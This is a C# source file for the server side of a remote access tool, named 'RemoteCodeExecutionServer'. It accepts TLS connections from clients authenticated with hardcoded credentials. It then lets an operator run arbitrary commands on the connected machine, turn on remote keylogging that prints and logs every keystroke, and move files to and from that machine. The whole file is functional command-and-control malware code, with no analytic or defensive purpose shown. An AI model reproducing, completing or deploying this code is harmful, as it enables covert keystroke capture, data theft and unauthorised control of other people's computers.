using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace RemoteCodeExecutionServer
{
    enum MessageType
    {
        Command = 0,
        Response = 1,
        Keylog = 2,
        FileChunk = 3,
        FileEnd = 4
    }

    class Program
    {
        private const string Username = "BHI78h8uU8G6#%*";
        private const string Password = "KNKBUBI88h97===";
        private const string CertFile = "server.pfx"; // Ensure this file exists in the server directory
        private const string CertPassword = "yourpassword"; // Replace with your certificate password

        public static async Task Main(string[] args)
        {
            while (true)
            {
                int port;
                while (true)
                {
                    Console.Write("Enter the port number to listen on: ");
                    string? input = Console.ReadLine();
                    if (string.IsNullOrEmpty(input))
                    {
                        Console.WriteLine("Port number cannot be empty. Please enter a valid number.");
                        continue;
                    }
                    if (int.TryParse(input, out port) && port >= 1 && port <= 65535)
                        break;
                    Console.WriteLine("Invalid port number. Please enter a number between 1 and 65535.");
                }

                try
                {
                    await ServerMain(port);
                    break;
                }
                catch (SocketException ex)
                {
                    Console.WriteLine($"Failed to start server on port {port}: {ex.Message}");
                    Console.WriteLine("Please choose a different port.");
                }
            }
        }

        public static async Task ServerMain(int port)
        {
            var listener = new TcpListener(IPAddress.Any, port);
            listener.Start();
            Console.WriteLine($"Server started on port {port}. Waiting for connections...");

            while (true)
            {
                var client = await listener.AcceptTcpClientAsync();
                _ = HandleClientAsync(client, port); // Handle each client in a separate task
            }
        }

        private static async Task HandleClientAsync(TcpClient client, int port)
        {
            var logger = new Logger($"server_{port}.log");
            try
            {
                using (var stream = client.GetStream())
                using (var sslStream = new SslStream(stream, false))
                {
                    var cert = new X509Certificate2(CertFile, CertPassword);
                    await sslStream.AuthenticateAsServerAsync(cert, false, SslProtocols.Tls12, false);
                    var connection = new ConnectionManager(client, sslStream);

                    Console.WriteLine("Client connected");
                    if (await AuthenticateClientAsync(connection))
                    {
                        Console.WriteLine("Client authenticated successfully.");
                        await HandleCommandsAsync(connection, logger);
                    }
                    else
                    {
                        Console.WriteLine("Client failed authentication.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling client: {ex.Message}");
                logger.Log("Client Error", ex.Message);
            }
            finally
            {
                client.Close();
            }
        }

        private static async Task<bool> AuthenticateClientAsync(ConnectionManager connection)
        {
            var username = await connection.ReadMessageAsync();
            var password = await connection.ReadMessageAsync();

            if (username == Username && password == Password)
            {
                await connection.SendMessageAsync("OK");
                return true;
            }
            await connection.SendMessageAsync("FAIL");
            return false;
        }

        private static async Task HandleCommandsAsync(ConnectionManager connection, Logger logger)
        {
            bool inKeylogMode = false;

            while (true)
            {
                if (!inKeylogMode)
                {
                    Console.Write("Enter command: ");
                    var command = Console.ReadLine();
                    if (string.IsNullOrEmpty(command)) continue;

                    if (command == "/keylog")
                    {
                        inKeylogMode = true;
                        await connection.SendCommandAsync("start_keylog");
                        _ = Task.Run(async () =>
                        {
                            while (inKeylogMode)
                            {
                                try
                                {
                                    var (type, data) = await connection.ReceiveTypedDataAsync();
                                    if (type == MessageType.Keylog)
                                    {
                                        var key = Encoding.UTF8.GetString(data);
                                        Console.WriteLine($"Key pressed: {key}");
                                        logger.Log("Keylog", key);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"Error receiving keylog: {ex.Message}");
                                    inKeylogMode = false;
                                }
                            }
                        });
                    }
                    else if (command == "/exit")
                    {
                        await connection.SendCommandAsync("/disconnect");
                        break;
                    }
                    else if (command == "/exit -f")
                    {
                        await connection.SendCommandAsync("/exit -f");
                        Environment.Exit(0);
                    }
                    else
                    {
                        await connection.SendCommandAsync(command);

                        if (command.StartsWith("upload "))
                        {
                            var filePath = command.Substring(7);
                            using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                            {
                                while (true)
                                {
                                    var (type, data) = await connection.ReceiveTypedDataAsync();
                                    if (type == MessageType.FileChunk)
                                        await fileStream.WriteAsync(data, 0, data.Length);
                                    else if (type == MessageType.FileEnd)
                                        break;
                                }
                            }
                            var (respType, respData) = await connection.ReceiveTypedDataAsync();
                            if (respType == MessageType.Response)
                            {
                                var result = Encoding.UTF8.GetString(respData);
                                Console.WriteLine("Result:\n" + result);
                                logger.Log(command, result);
                            }
                        }
                        else if (command.StartsWith("download "))
                        {
                            var filePath = command.Substring(9);
                            try
                            {
                                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                                {
                                    var buffer = new byte[1024];
                                    int bytesRead;
                                    while ((bytesRead = await fileStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                                    {
                                        var chunk = new byte[bytesRead];
                                        Array.Copy(buffer, chunk, bytesRead);
                                        await connection.SendTypedDataAsync(MessageType.FileChunk, chunk);
                                    }
                                    await connection.SendTypedDataAsync(MessageType.FileEnd, new byte[0]);
                                }
                                var (type, data) = await connection.ReceiveTypedDataAsync();
                                if (type == MessageType.Response)
                                {
                                    var result = Encoding.UTF8.GetString(data);
                                    Console.WriteLine("Result:\n" + result);
                                    logger.Log(command, result);
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"Error sending file: {ex.Message}");
                                logger.Log(command, $"Error: {ex.Message}");
                            }
                        }
                        else
                        {
                            var (type, data) = await connection.ReceiveTypedDataAsync();
                            if (type == MessageType.Response)
                            {
                                var result = Encoding.UTF8.GetString(data);
                                Console.WriteLine("Result:\n" + result);
                                logger.Log(command, result);
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("Enter /rce to go back to command mode");
                    var input = Console.ReadLine();
                    if (input == "/rce")
                    {
                        inKeylogMode = false;
                        await connection.SendCommandAsync("stop_keylog");
                    }
                }
            }
        }
    }

    class Logger
    {
        private readonly string _logFile;

        public Logger(string logFile)
        {
            _logFile = logFile;
        }

        public void Log(string command, string result)
        {
            try
            {
                var logEntry = $"{DateTime.Now}: Command: {command}\nResult: {result}\n";
                File.AppendAllText(_logFile, logEntry);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to log command: {ex.Message}");
            }
        }
    }

    class ConnectionManager
    {
        private readonly TcpClient _client;
        private readonly SslStream _sslStream;
        private readonly int _timeoutMs;

        public ConnectionManager(TcpClient client, SslStream sslStream, int timeoutMs = 10000)
        {
            _client = client;
            _sslStream = sslStream;
            _timeoutMs = timeoutMs;
            _client.ReceiveTimeout = _timeoutMs;
            _client.SendTimeout = _timeoutMs;
        }

        public async Task SendMessageAsync(string message)
        {
            try
            {
                var messageBytes = Encoding.UTF8.GetBytes(message);
                var lengthPrefix = BitConverter.GetBytes(messageBytes.Length);
                await _sslStream.WriteAsync(lengthPrefix, 0, lengthPrefix.Length);
                await _sslStream.WriteAsync(messageBytes, 0, messageBytes.Length);
                await _sslStream.FlushAsync();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to send message: {ex.Message}");
            }
        }

        public async Task<string> ReadMessageAsync()
        {
            try
            {
                var lengthBuffer = new byte[4];
                await _sslStream.ReadAsync(lengthBuffer, 0, lengthBuffer.Length);
                var messageLength = BitConverter.ToInt32(lengthBuffer, 0);
                var messageBuffer = new byte[messageLength];
                var bytesRead = 0;

                while (bytesRead < messageLength)
                {
                    bytesRead += await _sslStream.ReadAsync(messageBuffer, bytesRead, messageLength - bytesRead);
                }

                return Encoding.UTF8.GetString(messageBuffer);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to read message: {ex.Message}");
            }
        }

        public async Task SendTypedDataAsync(MessageType type, byte[] data)
        {
            try
            {
                var typeByte = (byte)type;
                var lengthBytes = BitConverter.GetBytes(data.Length);
                await _sslStream.WriteAsync(new[] { typeByte }, 0, 1);
                await _sslStream.WriteAsync(lengthBytes, 0, 4);
                if (data.Length > 0)
                    await _sslStream.WriteAsync(data, 0, data.Length);
                await _sslStream.FlushAsync();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to send typed data: {ex.Message}");
            }
        }

        public async Task<(MessageType type, byte[] data)> ReceiveTypedDataAsync()
        {
            try
            {
                var typeBuffer = new byte[1];
                await _sslStream.ReadAsync(typeBuffer, 0, 1);
                var type = (MessageType)typeBuffer[0];

                var lengthBuffer = new byte[4];
                await _sslStream.ReadAsync(lengthBuffer, 0, 4);
                var messageLength = BitConverter.ToInt32(lengthBuffer, 0);

                byte[] data = new byte[messageLength];
                if (messageLength > 0)
                {
                    var bytesRead = 0;
                    while (bytesRead < messageLength)
                        bytesRead += await _sslStream.ReadAsync(data, bytesRead, messageLength - bytesRead);
                }
                return (type, data);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to receive typed data: {ex.Message}");
            }
        }

        public async Task SendCommandAsync(string command)
        {
            var data = Encoding.UTF8.GetBytes(command);
            await SendTypedDataAsync(MessageType.Command, data);
        }
    }
}